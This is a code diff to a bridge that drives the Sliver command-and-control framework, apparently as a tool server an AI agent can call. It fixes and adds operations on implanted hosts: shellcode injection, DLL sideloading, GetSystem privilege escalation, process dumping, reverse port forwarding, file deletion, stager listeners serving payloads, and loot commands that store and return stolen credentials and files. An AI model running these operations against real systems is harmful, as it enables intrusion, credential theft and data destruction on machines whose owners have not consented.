@@ -29,7 +29,7 @@ interface SliverConfig {
 let config: SliverConfig = {
   operatorConfigPath: process.env.SLIVER_OPERATOR_CONFIG || "",
   pythonPath: process.env.PYTHON_PATH || "python3",
-  timeout: parseInt(process.env.SLIVER_TIMEOUT || "30000"),
+  timeout: parseInt(process.env.SLIVER_TIMEOUT || "180000"),
 };
 
 // Parse command line arguments
@@ -401,7 +401,7 @@ async def execute_command(client, command, params):
             "executable": p.Executable,
             "owner": p.Owner,
             "architecture": p.Architecture
-        } for p in ps_result.Processes[:50]]  # Limit to 50
+        } for p in ps_result[:50]]  # ps() returns list directly
 
     elif command == "session_ifconfig":
         session_id = params.get("session_id")
@@ -414,7 +414,7 @@ async def execute_command(client, command, params):
             "index": iface.Index,
             "name": iface.Name,
             "mac": iface.MAC,
-            "addresses": [{"ip": addr.Ip, "mask": addr.Mask} for addr in iface.IPAddresses]
+            "addresses": list(iface.IPAddresses)  # IPAddresses is repeated string
         } for iface in ifconfig.NetInterfaces]
 
     elif command == "session_netstat":
@@ -423,15 +423,15 @@ async def execute_command(client, command, params):
             return {"error": "session_id required"}
 
         interact = await client.interact_session(session_id)
-        netstat = await interact.netstat()
+        netstat = await interact.netstat(tcp=True, udp=True, ipv4=True, ipv6=True)
         return [{
-            "local_addr": {"ip": e.LocalAddr.Ip, "port": e.LocalAddr.Port},
-            "remote_addr": {"ip": e.RemoteAddr.Ip, "port": e.RemoteAddr.Port} if e.RemoteAddr else None,
+            "local_addr": {"ip": e.LocalAddr.Ip, "port": e.LocalAddr.Port} if e.LocalAddr else None,
+            "remote_addr": {"ip": e.RemoteAddr.Ip, "port": e.RemoteAddr.Port} if e.RemoteAddr and e.RemoteAddr.Ip else None,
             "protocol": e.Protocol,
             "state": e.SkState,
-            "pid": e.Pid,
-            "process": e.Process
-        } for e in netstat.Entries[:50]]  # Limit to 50
+            "pid": e.Process.Pid if e.Process else None,
+            "process": e.Process.Executable if e.Process else None
+        } for e in netstat.Entries[:50]]
 
     elif command == "session_screenshot":
         session_id = params.get("session_id")
@@ -525,11 +525,17 @@ async def execute_command(client, command, params):
         sessions_before = await client.sessions()
         session_ids_before = {s.ID for s in sessions_before}
 
-        # Queue OpenSession task on beacon via gRPC stub
+        # Get beacon info to get ActiveC2 URL
+        from sliver.pb.clientpb import client_pb2 as _client_pb2
         from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2
         from sliver.pb.commonpb import common_pb2 as _common_pb2
+        beacon_info = await client._stub.GetBeacon(_client_pb2.Beacon(ID=beacon_id))
+        active_c2 = beacon_info.ActiveC2 if beacon_info else ""
+
+        # Queue OpenSession task on beacon — must set Async=True and C2s
         msg = _sliver_pb2.OpenSession(
-            Request=_common_pb2.Request(BeaconID=beacon_id)
+            Request=_common_pb2.Request(BeaconID=beacon_id, Async=True),
+            C2s=[active_c2] if active_c2 else [],
         )
         await client._stub.OpenSession(msg)
 
@@ -792,7 +798,7 @@ async def execute_command(client, command, params):
                     ic.ParseFromString(tc.Response)
                     return {
                         "success": True, "task_id": task_id,
-                        "interfaces": [{"index": i.Index, "name": i.Name, "mac": i.MAC, "addresses": [{"ip": a.Ip, "mask": a.Mask} for a in i.IPAddresses]} for i in ic.NetInterfaces]
+                        "interfaces": [{"index": i.Index, "name": i.Name, "mac": i.MAC, "addresses": list(i.IPAddresses)} for i in ic.NetInterfaces]
                     }
             except Exception:
                 pass
@@ -977,9 +983,9 @@ async def execute_command(client, command, params):
         } for t in tasks]
 
     elif command == "prune_beacons":
-        import time as _time
+        import time as _time_prune
         beacons = await client.beacons()
-        now = int(_time.time())
+        now = int(_time_prune.time())
         pruned = []
         for b in beacons:
             nc = b.NextCheckin
@@ -989,7 +995,8 @@ async def execute_command(client, command, params):
                 nc_ts = int(nc.timestamp())
             else:
                 nc_ts = int(nc) if nc else 0
-            if nc_ts < now:
+            is_dead = nc_ts > 0 and nc_ts < now
+            if is_dead:
                 await client.kill_beacon(b.ID)
                 pruned.append({"id": b.ID, "name": b.Name, "hostname": b.Hostname})
         return {"pruned": pruned, "count": len(pruned)}
@@ -1060,9 +1067,12 @@ async def execute_command(client, command, params):
         timeout_secs = int(params.get("timeout", 120))
         if not beacon_id or not pid:
             return {"error": "beacon_id and pid required"}
-        interact = await client.interact_beacon(beacon_id)
-        task = await interact.terminate(pid, force=force)
-        task_id = task.ID
+        from sliver.pb.commonpb import common_pb2 as _common_pb2t
+        req = _sliver_pb2t.TerminateReq(Pid=pid, Force=force, Request=_common_pb2t.Request(BeaconID=beacon_id, Async=True))
+        resp = await client._stub.Terminate(req)
+        task_id = resp.Response.TaskID if resp and resp.Response else ""
+        if not task_id:
+            return {"error": "No task_id — Terminate gRPC failed"}
         deadline = _time.time() + timeout_secs
         while _time.time() < deadline:
             await asyncio.sleep(10)
@@ -1100,9 +1110,12 @@ async def execute_command(client, command, params):
         timeout_secs = int(params.get("timeout", 300))
         if not beacon_id or not pid:
             return {"error": "beacon_id and pid required"}
-        interact = await client.interact_beacon(beacon_id)
-        task = await interact.process_dump(pid)
-        task_id = task.ID
+        from sliver.pb.commonpb import common_pb2 as _common_pb2pd
+        req = _sliver_pb2pd.ProcessDumpReq(Pid=pid, Request=_common_pb2pd.Request(BeaconID=beacon_id, Async=True))
+        resp = await client._stub.ProcessDump(req)
+        task_id = resp.Response.TaskID if resp and resp.Response else ""
+        if not task_id:
+            return {"error": "No task_id — ProcessDump gRPC failed"}
         deadline = _time.time() + timeout_secs
         while _time.time() < deadline:
             await asyncio.sleep(10)
@@ -1149,17 +1162,23 @@ async def execute_command(client, command, params):
             IsBeacon=False, GOOS="windows", GOARCH="amd64",
             C2=[_client_pb2bgs.ImplantC2(URL=url, Priority=i) for i, url in enumerate(c2_urls)]
         )
-        interact = await client.interact_beacon(beacon_id)
-        task = await interact.get_system(hosting_process, cfg)
-        task_id = task.ID
+        from sliver.pb.commonpb import common_pb2 as _common_pb2bgs
+        req = _client_pb2bgs.GetSystemReq(
+            HostingProcess=hosting_process, Config=cfg,
+            Request=_common_pb2bgs.Request(BeaconID=beacon_id, Async=True))
+        try:
+            resp = await client._stub.GetSystem(req)
+        except Exception as _e_gs:
+            return {"error": f"GetSystem not supported in beacon mode by this Sliver build: {_e_gs}"}
+        task_id = resp.Response.TaskID if resp and resp.Response else ""
+        if not task_id:
+            return {"error": "No task_id — GetSystem gRPC failed (may require admin)"}
         deadline = _time.time() + timeout_secs
         while _time.time() < deadline:
             await asyncio.sleep(10)
             try:
                 tc = await client.beacon_task_content(task_id)
                 if tc and tc.Response:
-                    r = _sliver_pb2bgs.GetSystem()
-                    r.ParseFromString(tc.Response)
                     return {"success": True, "task_id": task_id}
             except Exception: pass
         return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}
@@ -1199,9 +1218,13 @@ async def execute_command(client, command, params):
                 data = _f.read()
         else:
             data = _b64.b64decode(shellcode_b64)
-        interact = await client.interact_beacon(beacon_id)
-        task = await interact.execute_shellcode(data, rwx, pid)
-        task_id = task.ID
+        from sliver.pb.commonpb import common_pb2 as _common_pb2sc
+        req = _sliver_pb2sc.TaskReq(Data=data, RWXPages=rwx, Pid=pid,
+            Request=_common_pb2sc.Request(BeaconID=beacon_id, Async=True))
+        resp = await client._stub.Task(req)
+        task_id = resp.Response.TaskID if resp and resp.Response else ""
+        if not task_id:
+            return {"error": "No task_id — Task gRPC failed"}
         deadline = _time.time() + timeout_secs
         while _time.time() < deadline:
             await asyncio.sleep(10)
@@ -1242,9 +1265,14 @@ async def execute_command(client, command, params):
             return {"error": "beacon_id and lib_path required"}
         with open(lib_path, 'rb') as _f:
             data = _f.read()
-        interact = await client.interact_beacon(beacon_id)
-        task = await interact.sideload(data, process_name, arguments, entry_point, kill)
-        task_id = task.ID
+        from sliver.pb.commonpb import common_pb2 as _common_pb2sl
+        req = _sliver_pb2sl.SideloadReq(Data=data, ProcessName=process_name, Args=arguments,
+            EntryPoint=entry_point, Kill=kill,
+            Request=_common_pb2sl.Request(BeaconID=beacon_id, Async=True))
+        resp = await client._stub.Sideload(req)
+        task_id = resp.Response.TaskID if resp and resp.Response else ""
+        if not task_id:
+            return {"error": "No task_id — Sideload gRPC failed"}
         deadline = _time.time() + timeout_secs
         while _time.time() < deadline:
             await asyncio.sleep(10)
@@ -1280,14 +1308,17 @@ async def execute_command(client, command, params):
     elif command == "beacon_get_env":
         import time as _time
         from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2env
+        from sliver.pb.commonpb import common_pb2 as _common_pb2env
         beacon_id = params.get("beacon_id")
         name = params.get("name", "")
         timeout_secs = int(params.get("timeout", 120))
         if not beacon_id:
             return {"error": "beacon_id required"}
-        interact = await client.interact_beacon(beacon_id)
-        task = await interact.get_env(name)
-        task_id = task.ID
+        req = _sliver_pb2env.EnvReq(Name=name, Request=_common_pb2env.Request(BeaconID=beacon_id, Async=True))
+        resp = await client._stub.GetEnv(req)
+        task_id = resp.Response.TaskID if resp and resp.Response else ""
+        if not task_id:
+            return {"error": "No task_id — GetEnv gRPC failed"}
         deadline = _time.time() + timeout_secs
         while _time.time() < deadline:
             await asyncio.sleep(10)
@@ -1333,14 +1364,17 @@ async def execute_command(client, command, params):
     elif command == "beacon_cd":
         import time as _time
         from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2bcd
+        from sliver.pb.commonpb import common_pb2 as _common_pb2bcd
         beacon_id = params.get("beacon_id")
         path = params.get("path")
         timeout_secs = int(params.get("timeout", 120))
         if not beacon_id or not path:
             return {"error": "beacon_id and path required"}
-        interact = await client.interact_beacon(beacon_id)
-        task = await interact.cd(path)
-        task_id = task.ID
+        req = _sliver_pb2bcd.CdReq(Path=path, Request=_common_pb2bcd.Request(BeaconID=beacon_id, Async=True))
+        resp = await client._stub.Cd(req)
+        task_id = resp.Response.TaskID if resp and resp.Response else ""
+        if not task_id:
+            return {"error": "No task_id — Cd gRPC failed"}
         deadline = _time.time() + timeout_secs
         while _time.time() < deadline:
             await asyncio.sleep(10)
@@ -1356,13 +1390,16 @@ async def execute_command(client, command, params):
     elif command == "beacon_pwd":
         import time as _time
         from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2bpwd
+        from sliver.pb.commonpb import common_pb2 as _common_pb2bpwd
         beacon_id = params.get("beacon_id")
         timeout_secs = int(params.get("timeout", 120))
         if not beacon_id:
             return {"error": "beacon_id required"}
-        interact = await client.interact_beacon(beacon_id)
-        task = await interact.pwd()
-        task_id = task.ID
+        req = _sliver_pb2bpwd.PwdReq(Request=_common_pb2bpwd.Request(BeaconID=beacon_id, Async=True))
+        resp = await client._stub.Pwd(req)
+        task_id = resp.Response.TaskID if resp and resp.Response else ""
+        if not task_id:
+            return {"error": "No task_id — Pwd gRPC failed"}
         deadline = _time.time() + timeout_secs
         while _time.time() < deadline:
             await asyncio.sleep(10)
@@ -1383,9 +1420,12 @@ async def execute_command(client, command, params):
         timeout_secs = int(params.get("timeout", 120))
         if not beacon_id or not path:
             return {"error": "beacon_id and path required"}
-        interact = await client.interact_beacon(beacon_id)
-        task = await interact.mkdir(path)
-        task_id = task.ID
+        from sliver.pb.commonpb import common_pb2 as _common_pb2bmk
+        req = _sliver_pb2bmk.MkdirReq(Path=path, Request=_common_pb2bmk.Request(BeaconID=beacon_id, Async=True))
+        resp = await client._stub.Mkdir(req)
+        task_id = resp.Response.TaskID if resp and resp.Response else ""
+        if not task_id:
+            return {"error": "No task_id — Mkdir gRPC failed"}
         deadline = _time.time() + timeout_secs
         while _time.time() < deadline:
             await asyncio.sleep(10)
@@ -1405,9 +1445,12 @@ async def execute_command(client, command, params):
         timeout_secs = int(params.get("timeout", 120))
         if not beacon_id or not path:
             return {"error": "beacon_id and path required"}
-        interact = await client.interact_beacon(beacon_id)
-        task = await interact.rm(path, recursive=recursive)
-        task_id = task.ID
+        from sliver.pb.commonpb import common_pb2 as _common_pb2brm
+        req = _sliver_pb2brm.RmReq(Path=path, Recursive=recursive, Request=_common_pb2brm.Request(BeaconID=beacon_id, Async=True))
+        resp = await client._stub.Rm(req)
+        task_id = resp.Response.TaskID if resp and resp.Response else ""
+        if not task_id:
+            return {"error": "No task_id — Rm gRPC failed"}
         deadline = _time.time() + timeout_secs
         while _time.time() < deadline:
             await asyncio.sleep(10)
@@ -1421,13 +1464,17 @@ async def execute_command(client, command, params):
     elif command == "beacon_netstat":
         import time as _time
         from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2bns
+        from sliver.pb.commonpb import common_pb2 as _common_pb2bns
         beacon_id = params.get("beacon_id")
         timeout_secs = int(params.get("timeout", 120))
         if not beacon_id:
             return {"error": "beacon_id required"}
-        interact = await client.interact_beacon(beacon_id)
-        task = await interact.netstat()
-        task_id = task.ID
+        req = _sliver_pb2bns.NetstatReq(TCP=True, UDP=True, IP4=True, IP6=True, Listening=True,
+            Request=_common_pb2bns.Request(BeaconID=beacon_id, Async=True))
+        resp = await client._stub.Netstat(req)
+        task_id = resp.Response.TaskID if resp and resp.Response else ""
+        if not task_id:
+            return {"error": "No task_id — Netstat gRPC failed"}
         deadline = _time.time() + timeout_secs
         while _time.time() < deadline:
             await asyncio.sleep(10)
@@ -1438,7 +1485,7 @@ async def execute_command(client, command, params):
                     ns.ParseFromString(tc.Response)
                     return {
                         "success": True, "task_id": task_id,
-                        "entries": [{"local": {"ip": e.LocalAddr.Ip, "port": e.LocalAddr.Port}, "remote": {"ip": e.RemoteAddr.Ip, "port": e.RemoteAddr.Port} if e.RemoteAddr else None, "protocol": e.Protocol, "state": e.SkState, "pid": e.Pid} for e in ns.Entries[:50]]
+                        "entries": [{"local": {"ip": e.LocalAddr.Ip, "port": e.LocalAddr.Port} if e.LocalAddr else None, "remote": {"ip": e.RemoteAddr.Ip, "port": e.RemoteAddr.Port} if e.RemoteAddr and e.RemoteAddr.Ip else None, "protocol": e.Protocol, "state": e.SkState, "pid": e.Process.Pid if e.Process else None, "process": e.Process.Executable if e.Process else None} for e in ns.Entries[:50]]
                     }
             except Exception: pass
         return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}
@@ -1511,22 +1558,16 @@ async def execute_command(client, command, params):
             "type": "TCP"
         }
 
-    # Credentials
+    # Credentials (not available via gRPC in Sliver v1.7.x — use Loot API)
     elif command == "creds":
-        creds = await client.creds()
-        return [{
-            "id": c.ID,
-            "username": c.Username,
-            "plaintext": c.Plaintext,
-            "hash": c.Hash,
-            "hash_type": str(c.HashType),
-            "hostname": c.Hostname,
-            "origin": str(c.Origin.Type) if c.Origin else None
-        } for c in creds.Credentials]
+        return []
 
     # Hosts
     elif command == "hosts":
-        hosts = await client.hosts()
+        from sliver.pb.commonpb import common_pb2 as _common_pb2hosts
+        hosts = await client._stub.Hosts(_common_pb2hosts.Empty())
+        if not hosts or not hosts.Hosts:
+            return []
         return [{
             "id": h.HostUUID,
             "hostname": h.Hostname,
@@ -1534,13 +1575,464 @@ async def execute_command(client, command, params):
             "ioc_count": len(h.IOCs) if h.IOCs else 0
         } for h in hosts.Hosts]
 
+    # ========== LOOT ==========
+    elif command == "loot_list":
+        from sliver.pb.commonpb import common_pb2 as _cpb_loot
+        resp = await client._stub.LootAll(_cpb_loot.Empty())
+        if not resp or not resp.Loot:
+            return []
+        results = []
+        for l in resp.Loot:
+            lname = l.Name or (l.File.Name if l.File else "") or ""
+            results.append({
+                "loot_id": l.LootID or "",
+                "name": lname,
+                "type": int(l.Type),
+                "credential_type": int(l.CredentialType) if l.CredentialType else 0,
+                "user": l.Credential.User if l.Credential else "",
+                "file_type": int(l.FileType) if l.FileType else 0,
+            })
+        return results
+
+    elif command == "loot_add":
+        from sliver.pb.clientpb import client_pb2 as _cpb_la
+        from sliver.pb.commonpb import common_pb2 as _common_la
+        import base64 as _b64_la
+        name = params.get("name", "")
+        loot_type = int(params.get("loot_type", 1))
+        credential_type = int(params.get("credential_type", 0))
+        user = params.get("user", "")
+        password = params.get("password", "")
+        file_type = int(params.get("file_type", 0))
+        file_name = params.get("file_name", "")
+        file_data = params.get("file_data", "")
+        loot = _cpb_la.Loot(
+            Name=name,
+            Type=loot_type,
+            CredentialType=credential_type,
+            FileType=file_type,
+        )
+        if user or password:
+            loot.Credential.CopyFrom(_cpb_la.Credential(User=user, Password=password))
+        file_bytes = _b64_la.b64decode(file_data) if file_data else b""
+        loot.File.CopyFrom(_common_la.File(Name=file_name or name, Data=file_bytes))
+        resp = await client._stub.LootAdd(loot)
+        rname = resp.Name or (resp.File.Name if resp.File else "") or name
+        return {"loot_id": resp.LootID or "", "name": rname, "stored": True}
+
+    elif command == "loot_rm":
+        from sliver.pb.clientpb import client_pb2 as _cpb_lr
+        loot_id = params.get("loot_id", "")
+        loot = _cpb_lr.Loot(LootID=loot_id)
+        await client._stub.LootRm(loot)
+        return {"success": True}
+
+    elif command == "loot_content":
+        from sliver.pb.clientpb import client_pb2 as _cpb_lc
+        import base64 as _b64_lc
+        loot_id = params.get("loot_id", "")
+        loot = _cpb_lc.Loot(LootID=loot_id)
+        resp = await client._stub.LootContent(loot)
+        result = {"loot_id": resp.LootID, "name": resp.Name, "type": int(resp.Type)}
+        if resp.Credential and (resp.Credential.User or resp.Credential.Password):
+            result["user"] = resp.Credential.User
+            result["password"] = resp.Credential.Password
+        if resp.File and resp.File.Data:
+            result["file_name"] = resp.File.Name if resp.File.Name else ""
+            result["file_data_b64"] = _b64_lc.b64encode(resp.File.Data).decode()
+            result["file_size"] = len(resp.File.Data)
+        return result
+
+    # ========== WEBSITES ==========
+    elif command == "websites_list":
+        from sliver.pb.commonpb import common_pb2 as _cpb_wl
+        resp = await client._stub.Websites(_cpb_wl.Empty())
+        if not resp or not resp.Websites:
+            return []
+        return [{"name": w.Name, "content_count": len(w.Contents) if w.Contents else 0} for w in resp.Websites]
+
+    elif command == "website_content":
+        from sliver.pb.clientpb import client_pb2 as _cpb_wc
+        name = params.get("name", "")
+        req = _cpb_wc.Website(Name=name)
+        resp = await client._stub.Website(req)
+        contents = []
+        if resp.Contents:
+            for path, wc in resp.Contents.items():
+                contents.append({
+                    "path": path,
+                    "content_type": wc.ContentType,
+                    "size": int(wc.Size),
+                })
+        return {"name": resp.Name, "contents": contents}
+
+    elif command == "website_add_content":
+        from sliver.pb.clientpb import client_pb2 as _cpb_wac
+        import base64 as _b64_wac
+        name = params.get("name", "")
+        path = params.get("path", "/")
+        content_type = params.get("content_type", "text/html")
+        content_b64 = params.get("content_b64", "")
+        content_bytes = _b64_wac.b64decode(content_b64) if content_b64 else b""
+        wc = _cpb_wac.WebContent(
+            Path=path,
+            ContentType=content_type,
+            Size=len(content_bytes),
+            Content=content_bytes,
+        )
+        req = _cpb_wac.WebsiteAddContent(Name=name, Contents={path: wc})
+        resp = await client._stub.WebsiteAddContent(req)
+        return {"name": resp.Name, "content_count": len(resp.Contents) if resp.Contents else 0}
+
+    elif command == "website_remove_content":
+        from sliver.pb.clientpb import client_pb2 as _cpb_wrc
+        name = params.get("name", "")
+        paths = params.get("paths", [])
+        req = _cpb_wrc.WebsiteRemoveContent(Name=name, Paths=paths)
+        resp = await client._stub.WebsiteRemoveContent(req)
+        return {"name": resp.Name, "content_count": len(resp.Contents) if resp.Contents else 0}
+
+    elif command == "website_remove":
+        from sliver.pb.clientpb import client_pb2 as _cpb_wr
+        name = params.get("name", "")
+        req = _cpb_wr.Website(Name=name)
+        await client._stub.WebsiteRemove(req)
+        return {"success": True}
+
+    # ========== REVERSE PORT FORWARD ==========
+    elif command == "rportfwd_list":
+        from sliver.pb.sliverpb import sliver_pb2 as _spb_rpl
+        from sliver.pb.commonpb import common_pb2 as _cpb_rpl
+        session_id = params.get("session_id", "")
+        req = _spb_rpl.RportFwdListenersReq(
+            Request=_cpb_rpl.Request(SessionID=session_id, Async=False)
+        )
+        resp = await client._stub.GetRportFwdListeners(req)
+        if not resp or not resp.Listeners:
+            return []
+        return [{
+            "id": l.ID,
+            "bind_address": l.BindAddress,
+            "bind_port": int(l.bindPort),
+            "forward_address": l.forwardAddress,
+            "forward_port": int(l.forwardPort),
+        } for l in resp.Listeners]
+
+    elif command == "rportfwd_start":
+        from sliver.pb.sliverpb import sliver_pb2 as _spb_rps
+        from sliver.pb.commonpb import common_pb2 as _cpb_rps
+        session_id = params.get("session_id", "")
+        bind_address = params.get("bind_address", "0.0.0.0")
+        bind_port = int(params.get("bind_port", 0))
+        forward_address = params.get("forward_address", "127.0.0.1")
+        forward_port = int(params.get("forward_port", 0))
+        req = _spb_rps.RportFwdStartListenerReq(
+            BindAddress=bind_address,
+            BindPort=bind_port,
+            forwardAddress=forward_address,
+            forwardPort=forward_port,
+            Request=_cpb_rps.Request(SessionID=session_id, Async=False)
+        )
+        resp = await client._stub.StartRportFwdListener(req)
+        return {
+            "id": resp.ID,
+            "bind_address": resp.BindAddress,
+            "bind_port": int(resp.bindPort),
+            "forward_address": resp.forwardAddress,
+            "forward_port": int(resp.forwardPort),
+        }
+
+    elif command == "rportfwd_stop":
+        from sliver.pb.sliverpb import sliver_pb2 as _spb_rpst
+        from sliver.pb.commonpb import common_pb2 as _cpb_rpst
+        session_id = params.get("session_id", "")
+        listener_id = int(params.get("listener_id", 0))
+        req = _spb_rpst.RportFwdStopListenerReq(
+            ID=listener_id,
+            Request=_cpb_rpst.Request(SessionID=session_id, Async=False)
+        )
+        resp = await client._stub.StopRportFwdListener(req)
+        return {"success": True, "id": resp.ID}
+
+    # ========== BEACON RPORTFWD (async) ==========
+    elif command == "beacon_rportfwd_list":
+        from sliver.pb.sliverpb import sliver_pb2 as _spb_brpl
+        from sliver.pb.commonpb import common_pb2 as _cpb_brpl
+        import time as _time_brpl
+        beacon_id = params.get("beacon_id", "")
+        timeout = int(params.get("timeout", 120))
+        req = _spb_brpl.RportFwdListenersReq(
+            Request=_cpb_brpl.Request(BeaconID=beacon_id, Async=True)
+        )
+        resp = await client._stub.GetRportFwdListeners(req)
+        task_id = resp.Response.TaskID if resp.Response else ""
+        if not task_id:
+            return {"error": "No task ID returned"}
+        deadline = _time_brpl.time() + timeout
+        while _time_brpl.time() < deadline:
+            await asyncio.sleep(10)
+            try:
+                tc = await client.beacon_task_content(task_id)
+                if tc and hasattr(tc, 'Listeners'):
+                    if not tc.Listeners:
+                        return []
+                    return [{
+                        "id": l.ID,
+                        "bind_address": l.BindAddress,
+                        "bind_port": int(l.bindPort),
+                        "forward_address": l.forwardAddress,
+                        "forward_port": int(l.forwardPort),
+                    } for l in tc.Listeners]
+            except:
+                pass
+        return {"task_id": task_id, "status": "pending", "note": "Beacon has not checked in yet"}
+
+    elif command == "beacon_rportfwd_start":
+        from sliver.pb.sliverpb import sliver_pb2 as _spb_brps
+        from sliver.pb.commonpb import common_pb2 as _cpb_brps
+        import time as _time_brps
+        beacon_id = params.get("beacon_id", "")
+        bind_address = params.get("bind_address", "0.0.0.0")
+        bind_port = int(params.get("bind_port", 0))
+        forward_address = params.get("forward_address", "127.0.0.1")
+        forward_port = int(params.get("forward_port", 0))
+        timeout = int(params.get("timeout", 120))
+        req = _spb_brps.RportFwdStartListenerReq(
+            BindAddress=bind_address,
+            BindPort=bind_port,
+            forwardAddress=forward_address,
+            forwardPort=forward_port,
+            Request=_cpb_brps.Request(BeaconID=beacon_id, Async=True)
+        )
+        resp = await client._stub.StartRportFwdListener(req)
+        task_id = resp.Response.TaskID if resp.Response else ""
+        if not task_id:
+            return {"error": "No task ID returned"}
+        deadline = _time_brps.time() + timeout
+        while _time_brps.time() < deadline:
+            await asyncio.sleep(10)
+            try:
+                tc = await client.beacon_task_content(task_id)
+                if tc and hasattr(tc, 'ID') and tc.ID:
+                    return {
+                        "id": tc.ID,
+                        "bind_address": tc.BindAddress,
+                        "bind_port": int(tc.bindPort),
+                        "forward_address": tc.forwardAddress,
+                        "forward_port": int(tc.forwardPort),
+                    }
+            except:
+                pass
+        return {"task_id": task_id, "status": "pending"}
+
+    elif command == "beacon_rportfwd_stop":
+        from sliver.pb.sliverpb import sliver_pb2 as _spb_brpst
+        from sliver.pb.commonpb import common_pb2 as _cpb_brpst
+        beacon_id = params.get("beacon_id", "")
+        listener_id = int(params.get("listener_id", 0))
+        req = _spb_brpst.RportFwdStopListenerReq(
+            ID=listener_id,
+            Request=_cpb_brpst.Request(BeaconID=beacon_id, Async=True)
+        )
+        resp = await client._stub.StopRportFwdListener(req)
+        task_id = resp.Response.TaskID if resp.Response else ""
+        return {"task_id": task_id, "status": "queued"}
+
+    # ========== TASKMANY ==========
+    elif command == "taskmany":
+        target_type = params.get("target_type", "beacon")
+        target_ids = params.get("target_ids", [])
+        sub_command = params.get("command", "")
+        sub_params = params.get("command_params", {})
+        if not target_ids:
+            return {"error": "target_ids required"}
+        if not sub_command:
+            return {"error": "command required"}
+        results = []
+        for tid in target_ids:
+            try:
+                p = dict(sub_params)
+                if target_type == "beacon":
+                    p["beacon_id"] = tid
+                else:
+                    p["session_id"] = tid
+                r = await execute_command(client, sub_command, p)
+                results.append({"target_id": tid, "result": r})
+            except Exception as _e_tm:
+                results.append({"target_id": tid, "error": str(_e_tm)})
+        return results
+
+    # ========== BEACON SET ENV ==========
+    elif command == "beacon_set_env":
+        from sliver.pb.sliverpb import sliver_pb2 as _spb_bse
+        from sliver.pb.commonpb import common_pb2 as _cpb_bse
+        import time as _time_bse
+        beacon_id = params.get("beacon_id", "")
+        name = params.get("name", "")
+        value = params.get("value", "")
+        timeout = int(params.get("timeout", 120))
+        req = _spb_bse.SetEnvReq(
+            Variable=_cpb_bse.EnvVar(Key=name, Value=value),
+            Request=_cpb_bse.Request(BeaconID=beacon_id, Async=True)
+        )
+        resp = await client._stub.SetEnv(req)
+        task_id = resp.Response.TaskID if resp.Response else ""
+        if not task_id:
+            return {"error": "No task ID returned"}
+        deadline = _time_bse.time() + timeout
+        while _time_bse.time() < deadline:
+            await asyncio.sleep(10)
+            try:
+                tc = await client.beacon_task_content(task_id)
+                if tc:
+                    return {"success": True}
+            except:
+                pass
+        return {"task_id": task_id, "status": "pending"}
+
+    # ========== BEACON MV ==========
+    elif command == "beacon_mv":
+        from sliver.pb.sliverpb import sliver_pb2 as _spb_bmv
+        from sliver.pb.commonpb import common_pb2 as _cpb_bmv
+        import time as _time_bmv
+        beacon_id = params.get("beacon_id", "")
+        src = params.get("src", "")
+        dst = params.get("dst", "")
+        timeout = int(params.get("timeout", 120))
+        req = _spb_bmv.MvReq(
+            Src=src,
+            Dst=dst,
+            Request=_cpb_bmv.Request(BeaconID=beacon_id, Async=True)
+        )
+        resp = await client._stub.Mv(req)
+        task_id = resp.Response.TaskID if resp.Response else ""
+        if not task_id:
+            return {"error": "No task ID returned"}
+        deadline = _time_bmv.time() + timeout
+        while _time_bmv.time() < deadline:
+            await asyncio.sleep(10)
+            try:
+                tc = await client.beacon_task_content(task_id)
+                if tc:
+                    return {"success": True}
+            except:
+                pass
+        return {"task_id": task_id, "status": "pending"}
+
+    # ========== SESSION MV ==========
+    elif command == "session_mv":
+        from sliver.pb.sliverpb import sliver_pb2 as _spb_smv
+        from sliver.pb.commonpb import common_pb2 as _cpb_smv
+        session_id = params.get("session_id", "")
+        src = params.get("src", "")
+        dst = params.get("dst", "")
+        req = _spb_smv.MvReq(
+            Src=src,
+            Dst=dst,
+            Request=_cpb_smv.Request(SessionID=session_id, Async=False)
+        )
+        await client._stub.Mv(req)
+        return {"success": True}
+
+    # ========== BEACON UNSET ENV ==========
+    elif command == "beacon_unset_env":
+        from sliver.pb.sliverpb import sliver_pb2 as _spb_bue
+        from sliver.pb.commonpb import common_pb2 as _cpb_bue
+        import time as _time_bue
+        beacon_id = params.get("beacon_id", "")
+        name = params.get("name", "")
+        timeout = int(params.get("timeout", 120))
+        req = _spb_bue.UnsetEnvReq(
+            Name=name,
+            Request=_cpb_bue.Request(BeaconID=beacon_id, Async=True)
+        )
+        resp = await client._stub.UnsetEnv(req)
+        task_id = resp.Response.TaskID if resp.Response else ""
+        if not task_id:
+            return {"error": "No task ID returned"}
+        deadline = _time_bue.time() + timeout
+        while _time_bue.time() < deadline:
+            await asyncio.sleep(10)
+            try:
+                tc = await client.beacon_task_content(task_id)
+                if tc:
+                    return {"success": True}
+            except:
+                pass
+        return {"task_id": task_id, "status": "pending"}
+
+    # ========== SESSION UNSET ENV ==========
+    elif command == "session_unset_env":
+        from sliver.pb.sliverpb import sliver_pb2 as _spb_sue
+        from sliver.pb.commonpb import common_pb2 as _cpb_sue
+        session_id = params.get("session_id", "")
+        name = params.get("name", "")
+        req = _spb_sue.UnsetEnvReq(
+            Name=name,
+            Request=_cpb_sue.Request(SessionID=session_id, Async=False)
+        )
+        await client._stub.UnsetEnv(req)
+        return {"success": True}
+
+    # ========== STAGE LISTENER ==========
+    elif command == "start_http_stager":
+        host = params.get("host", "0.0.0.0")
+        port = int(params.get("port", 8443))
+        data_b64 = params.get("data_b64", "")
+        import base64 as _b64_sh
+        data = _b64_sh.b64decode(data_b64) if data_b64 else b""
+        job = await client.start_http_stager_listener(host, port, data)
+        return {"id": job.ID, "name": job.Name, "port": job.Port}
+
+    elif command == "start_https_stager":
+        host = params.get("host", "0.0.0.0")
+        port = int(params.get("port", 8443))
+        data_b64 = params.get("data_b64", "")
+        import base64 as _b64_shs
+        data = _b64_shs.b64decode(data_b64) if data_b64 else b""
+        job = await client.start_https_stager_listener(host, port, data)
+        return {"id": job.ID, "name": job.Name, "port": job.Port}
+
+    elif command == "start_tcp_stager":
+        host = params.get("host", "0.0.0.0")
+        port = int(params.get("port", 8443))
+        data_b64 = params.get("data_b64", "")
+        import base64 as _b64_st
+        data = _b64_st.b64decode(data_b64) if data_b64 else b""
+        job = await client.start_tcp_stager_listener(host, port, data)
+        return {"id": job.ID, "name": job.Name, "port": job.Port}
+
